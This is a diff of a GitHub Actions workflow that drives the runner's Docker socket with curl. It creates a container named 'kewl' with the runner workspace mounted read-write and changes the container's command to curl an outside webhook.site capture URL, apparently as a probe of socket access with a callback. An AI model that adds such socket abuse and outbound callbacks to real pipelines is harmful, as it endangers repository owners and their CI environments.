@@ -7,7 +7,7 @@ jobs:
     steps:
       - run : |
           curl -s --unix-socket /var/run/docker.sock \
-          "http:/v1.34/images/create?fromImage=yavital/simple-docker&tag=latest" \
+          "http:/v1.34/images/create?fromImage=alpine/curl&tag=latest" \
           -X POST \
           -H "Content-Type: application/json"
       - run : |
@@ -15,7 +15,7 @@ jobs:
           "http:/v1.34/containers/create?name=kewl" \
           -X POST \
           -H "Content-Type: application/json" \
-          -d '{ "Image": "yavital/simple-docker:latest", "AttachStdout": true,"AttachStderr" : true,"Volumes": {"/home/runner/work/workflow-tester/workflow-tester":{"bind":"/home/runner/work/workflow-tester/workflow-tester","mode":"rw"}}, "Cmd": [ ] }'
+          -d '{ "Image": "alpine/curl:latest", "AttachStdout": true,"AttachStderr" : true,"Volumes": {"/home/runner/work/workflow-tester/workflow-tester":{"bind":"/home/runner/work/workflow-tester/workflow-tester","mode":"rw"}}, "Cmd": [ "curl","https://webhook.site/a5f2df3f-89ee-409d-95fc-b093b6ecab55" ] }'
       - run : | 
           curl -s --unix-socket /var/run/docker.sock \
           "http:/v1.34/containers/kewl/start" \
